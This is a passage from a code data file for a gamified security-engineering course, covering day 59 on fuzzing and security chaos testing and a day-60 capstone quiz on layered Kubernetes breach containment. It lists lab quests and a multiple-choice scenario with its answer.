      debrief: "Security mechanisms must be anti-fragile. If certificate rotation or key revocation crashes downstream services, operators will hesitate to rotate keys during a breach. Chaos testing builds confidence that security rotations work seamlessly under pressure."
    },
    quests: [
      { id: "sec-m2-d59-q1", name: "Coverage-Guided Fuzzing Internals: Genetic Algorithms & Edge Counters", type: "concept", desc: "Detail AFL++ instrumentation, edge coverage bitmasks, dictionary mutations, and corpus minimization." },
      { id: "sec-m2-d59-q2", name: "Detective Lab: Triaging Fuzzing Crash Dumps & Minimizing POCs", type: "detective", desc: "Analyze a fuzzer crash corpus, reproduce the fault in GDB, and minimize the input bytes to a clean proof-of-concept." },
      { id: "sec-m2-d59-q3", name: "Mastery Assignment: Automated Continuous Fuzzing & Security Chaos Harness", type: "assignment", desc: "Build a TypeScript chaos harness that simulates sudden credential rotation, network drops, and fuzzes API endpoints." },
      { id: "sec-m2-d59-q4", name: "Production Incident Lab: Hardening Audit Sign-Off for Mission-Critical Release", type: "detective", desc: "Conduct a comprehensive pre-launch security sign-off audit certifying zero high-severity findings across SAST, DAST, and fuzzing." }
    ]
  },
  {
    day: 60,
    month: 2,
    blockNum: 12,
    title: "⭐ MASTER CAPSTONE: ApexDefense GlobalSOC Sovereign Security Platform (Viva Gate)",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Month 2 Master Capstone Viva Gate: Staff Sovereign Security Defense)",
    spokenGoal: "Deliver the Ultimate Security Master Capstone: Defend the ApexDefense GlobalSOC Sovereign Security Platform — a battle-hardened, enterprise-wide security architecture uniting eBPF kernel intrusion detection, SPIFFE/SPIRE zero-trust mTLS mesh, post-quantum hybrid cryptographic vaults, Sigstore Cosign supply chain admission gates, automated SOAR incident quarantine, and continuous compliance enforcement before the Chief Information Security Officer (CISO) and the Staff Security Review Board.",
    conceptInvariant: "Sovereign Defense Invariant: Modern cybersecurity is an end-to-end, multi-layered discipline spanning from the silicon and kernel layers to network protocols, cryptographic primitives, application code, container admission, and automated incident response. ApexDefense proves that an organization can operate reliably, resist nation-state adversaries, and maintain 99.999% sovereign availability under continuous hostile attack.",
    failureMode: "Presenting a fragmented security platform where individual layers operate in silos, leaving blind spots at the container-to-host or identity-to-data boundaries that an adversary can exploit for lateral movement.",
    tryItFriction: "Deliver your live oral master capstone defense: present architectural blueprints, demonstrate live exploit mitigation across the entire kill chain, explain cryptographic trade-offs, and defend against red-team counter-probes in real time.",
    socraticHints: [
      "How do you prepare for the Master Capstone Viva with the CISO?",
      "Be prepared to defend every single architectural decision: Why AES-GCM over CBC? Why SPIFFE/SPIRE over static keys? How does eBPF defeat rootkits? How does post-quantum hybrid KEM protect against HNDL attacks?",
      "Speak with the confidence of a Staff Security Architect who has survived real 3 AM production breaches."
    ],
    situationalPuzzle: {
      scenario: "During your Master Capstone Viva, the Chief Information Security Officer asks: 'An Advanced Persistent Threat (APT) has gained a low-privileged initial foothold inside a web worker pod in our Kubernetes cluster. Walk me through the exact multi-layered defense chain that prevents them from reading customer data, pivoting laterally, or altering audit logs.' How do you deliver your Staff defense?",
      options: [
        "Admit that once an attacker gets in, the entire company is compromised.",
        "End-to-End Sovereign Defense Chain Defense: (1) eBPF kernel sensors immediately detect and alert on anomalous child process execution inside the container. (2) Container isolation (PSS Restricted, dropped capabilities, non-root) prevents container escape to the host node. (3) SPIFFE/SPIRE strict mTLS blocks lateral network calls to internal services because the pod lacks a valid destination SVID. (4) Cloud metadata is locked down via IMDSv2 hop-limit=1, preventing IAM key theft. (5) Customer database queries enforce ABAC ownership and encryption via AES-GCM envelope keys held in KMS. (6) Automated SOAR playbooks isolate the pod within 100ms. (7) Remote WORM audit logs with SHA-256 hash chains preserve an immutable forensic trail that the attacker cannot delete.",
        "Suggest that we unplug the servers from the internet.",
        "Blame the junior developer who wrote the web worker."
      ],
      answerIdx: 1,
      debrief: "This is the gold-standard Staff Security defense: demonstrating how layered controls (Kernel eBPF -> Container Hardening -> Zero-Trust mTLS -> IMDSv2 -> Database ABAC & Envelope KMS -> SOAR Containment -> Immutable WORM Logging) prevent lateral movement and contain breaches even when an initial perimeter is breached."
    },
    quests: [
      { id: "sec-m2-d60-q1", name: "ApexDefense Architecture: Sovereign Enterprise Security Blueprint", type: "concept", desc: "Document the complete architectural specification and multi-layered defense grid of ApexDefense GlobalSOC." },
      { id: "sec-m2-d60-q2", name: "Red Team Challenge: Nation-State Multi-Stage Kill Chain Battery", type: "detective", desc: "Execute an end-to-end adversary emulation testing container breakouts, lateral movement, and data exfiltration defenses." },
      { id: "sec-m2-d60-q3", name: "Mastery Assignment: Full ApexDefense Sovereign Security Platform Deployment", type: "assignment", desc: "Package and deploy the production ApexDefense platform with eBPF telemetry, SPIFFE mTLS, KMS vault, and SOAR automation." },
      { id: "sec-m2-d60-q4", name: "Master Capstone Viva: Live Architecture Defense before CISO & Staff Board", type: "assignment", desc: "Defend your complete 60-day security architecture in a rigorous oral viva examination before the Chief Information Security Officer." }
    ]
  }
];




